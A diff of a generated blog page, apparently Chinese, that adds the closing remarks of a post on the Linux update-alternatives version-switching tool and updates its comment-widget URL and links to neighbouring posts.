+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><blockquote>
+<p>到这整合命令就说完了，其实还有一些其他的参数，比如remove从列表中删除已经注册的程序等等吧，感觉个人使用的时候还是交互式修改比较常用，shell脚本啥的可能还是要用set直接修改，然后使用这种方法可以管理很多软件，尤其是对于一些经常需要好几个版本软件切换的小伙伴，然后工具原理比较简单，有时间可以在Windows上搞一个，来一波GitHub摘星啥的。要是感觉我没说全可以去网上再看看，就这样吧。。</p>
 </blockquote>
 
         
@@ -581,8 +544,8 @@
 
 <script type="text/javascript">
     var disqus_config = function () {
-        this.page.url = 'http://blog.ssssdl.xyz/2019/03/19/XSS-Shell环境搭建及功能介绍/';  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = 'http://blog.ssssdl.xyz/2019/03/19/XSS-Shell环境搭建及功能介绍/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.url = 'http://blog.ssssdl.xyz/2019/08/08/分享一个实用的linux软件版本管理软件-update-alternatives/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://blog.ssssdl.xyz/2019/08/08/分享一个实用的linux软件版本管理软件-update-alternatives/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
     };
 </script>
 
@@ -631,21 +594,13 @@
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/2019/04/29/html内容安全策略/" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            新篇
-        </a>
-    
 
     <!-- Section Spacer -->
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
     
-        <a href="/2019/03/18/重新认识XSS/" id="post_nav-older" class="next-content">
+        <a href="/2019/07/12/ssrf-IP限制绕过思路/" id="post_nav-older" class="next-content">
             旧篇
             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
